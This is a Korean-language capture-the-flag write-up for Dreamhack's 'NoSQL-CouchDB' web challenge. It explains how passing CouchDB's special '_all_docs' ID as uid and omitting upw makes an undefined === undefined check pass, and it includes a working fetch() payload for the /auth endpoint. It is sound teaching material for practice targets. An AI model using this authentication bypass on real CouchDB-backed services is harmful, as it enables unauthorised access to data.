---
ctf_name: "Dreamhack"
challenge_name: "NoSQL-CouchDB"
category: "web"
difficulty: "easy"
author: "penguink-hub"
date: "2026-05-18"
points: 0
tags: [web, nosql, couchdb, injection]
---
# NoSQL-CouchDB
## 문제 설명
> CouchDB와 Node.js로 구성된 로그인 서비스에서 NoSQL 인젝션을 통해 FLAG 환경 변수를 탈취해야 하는 문제.
- Target URL: http://host8.dreamhack.games:14456/
## 풀이
### 분석
제공된 소스코드를 분석하면 다음과 같은 구성을 확인할 수 있습니다.
- docker-compose.yml: Node.js 앱(포트 3000)과 CouchDB로 구성되며 FLAG는 환경 변수로 주입됩니다.
- 로그인 페이지: uid와 upw 필드를 JSON으로 /auth 엔드포인트에 POST 요청합니다.
- app.js(메인 로직):
```javascript
app.post('/auth', function(req, res) {
    users.get(req.body.uid, function(err, result) {
        if (err) { res.send('error'); return; }
        if (result.upw === req.body.upw) {
            res.send(`FLAG: ${process.env.FLAG}`);
        } else {
            res.send('fail');
        }
    });
});
```
nano 라이브러리의 db.get()은 전달된 문자열을 CouchDB의 Document ID로 사용하여 직접 조회합니다. 그리고 result.upw와 req.body.upw를 === (strict equality)로 비교하여 일치하면 FLAG를 반환합니다.
### 취약점
두 가지 취약점이 결합되어 익스플로잇이 가능합니다.
첫 번째는 CouchDB 특수 엔드포인트 노출입니다. nano.db.get(uid)에서 uid 값을 검증하지 않기 때문에, _all_docs와 같은 CouchDB 내부 특수 Document ID를 그대로 전달할 수 있습니다. _all_docs는 CouchDB에서 모든 도큐먼트 목록을 반환하는 특수 엔드포인트입니다.
두 번째는 undefined === undefined 비교 우회입니다. _all_docs 응답 객체에는 upw 필드가 존재하지 않으므로 result.upw는 undefined가 됩니다. 요청 바디에서도 upw 키를 생략하면 req.body.upw 역시 undefined가 됩니다. JavaScript에서 undefined === undefined는 true이므로 조건을 통과하여 FLAG가 반환됩니다.
### 익스플로잇
브라우저의 개발자 도구 콘솔에서 아래 코드를 실행합니다.
```javascript
fetch("/auth", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ "uid": "_all_docs" })
})
.then(r => r.text())
.then(t => console.log(t));
```
uid에 _all_docs를 넣고 upw 키는 아예 생략하여 전송합니다. 서버는 CouchDB에서 _all_docs 응답을 받아오고, result.upw(undefined) === req.body.upw(undefined) 조건이 true가 되어 FLAG를 반환합니다.
### 플래그
DH{REDACTED}
